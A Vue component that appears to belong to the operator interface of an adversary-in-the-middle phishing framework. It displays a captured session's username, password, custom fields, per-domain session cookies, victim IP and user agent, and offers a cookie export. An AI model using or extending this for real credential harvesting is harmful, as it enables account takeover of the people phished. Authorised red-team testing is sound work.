<script setup lang="ts">
import { ref } from 'vue'
import { getMiragedSession, exportMiragedSessionCookies, type MiragedSession } from '../api/client'
import AppButton from './AppButton.vue'
import Card from './Card.vue'
import ErrorBanner from './ErrorBanner.vue'

const props = defineProps<{ miragedId: string }>()
const emit = defineEmits<{ close: [] }>()

const session = ref<MiragedSession | null>(null)
const loading = ref(false)
const error = ref('')

async function open(sessionId: string) {
  session.value = null
  error.value = ''
  loading.value = true
  try {
    session.value = await getMiragedSession(props.miragedId, sessionId)
  } catch (e: any) {
    error.value = e.message
  } finally {
    loading.value = false
  }
}

function close() {
  session.value = null
  error.value = ''
  emit('close')
}

function downloadCookies() {
  if (!session.value) return
  const url = exportMiragedSessionCookies(props.miragedId, session.value.id)
  window.open(url, '_blank')
}

defineExpose({ open, close })
</script>

<template>
  <Card v-if="session || loading || error" class="p-7 mb-4">
    <div class="flex items-center justify-between mb-5">
      <div class="text-xs font-mono text-dim uppercase tracking-wider">Session Details</div>
      <div class="flex items-center gap-3">
        <AppButton v-if="session?.cookie_tokens && Object.keys(session.cookie_tokens).length > 0" variant="secondary" @click="downloadCookies">Export Cookies</AppButton>
        <button @click="close" class="text-xs font-mono text-dim hover:text-primary transition-colors uppercase tracking-wider">Close</button>
      </div>
    </div>

    <div v-if="loading" class="text-sm font-mono text-dim">Loading session...</div>
    <ErrorBanner v-else-if="error" :message="error" />

    <div v-else-if="session" class="bg-bg border border-edge px-5 py-4 flex flex-col divide-y divide-edge">
      <!-- Credentials and captured fields -->
      <div v-if="session.username || session.password || (session.custom && Object.keys(session.custom).length > 0)" class="grid grid-cols-2 gap-x-8 gap-y-3 pb-6">
        <div v-if="session.username">
          <div class="text-xs text-dim font-mono">Username</div>
          <div class="text-sm text-primary font-mono select-all">{{ session.username }}</div>
        </div>
        <div v-if="session.password">
          <div class="text-xs text-dim font-mono">Password</div>
          <div class="text-sm text-primary font-mono select-all">{{ session.password }}</div>
        </div>
        <div v-for="(value, key) in session.custom" :key="key">
          <div class="text-xs text-dim font-mono">{{ key }}</div>
          <div class="text-sm text-primary font-mono select-all">{{ value }}</div>
        </div>
      </div>

      <!-- Cookies -->
      <div v-if="session.cookie_tokens && Object.keys(session.cookie_tokens).length > 0" class="flex flex-col gap-3 py-6">
        <template v-for="(cookies, domain) in session.cookie_tokens" :key="domain">
          <div v-for="(value, name) in cookies" :key="`${domain}-${name}`">
            <div class="text-xs text-dim font-mono">{{ name }} <span class="text-muted">({{ domain }})</span></div>
            <div class="text-sm text-primary font-mono select-all break-all">{{ value }}</div>
          </div>
        </template>
      </div>

      <!-- Metadata -->
      <div class="grid grid-cols-2 gap-x-8 gap-y-3 pt-6">
        <div v-if="session.remote_addr">
          <div class="text-xs text-dim font-mono">IP Address</div>
          <div class="text-sm text-primary font-mono select-all">{{ session.remote_addr }}</div>
        </div>
        <div v-if="session.phishlet">
          <div class="text-xs text-dim font-mono">Phishlet</div>
          <div class="text-sm text-primary font-mono">{{ session.phishlet }}</div>
        </div>
        <div v-if="session.started_at">
          <div class="text-xs text-dim font-mono">Started</div>
          <div class="text-sm text-primary font-mono">{{ new Date(session.started_at).toLocaleString() }}</div>
        </div>
        <div v-if="session.user_agent" class="col-span-2">
          <div class="text-xs text-dim font-mono">User Agent</div>
          <div class="text-sm text-primary font-mono select-all break-all">{{ session.user_agent }}</div>
        </div>
      </div>
    </div>
  </Card>
</template>
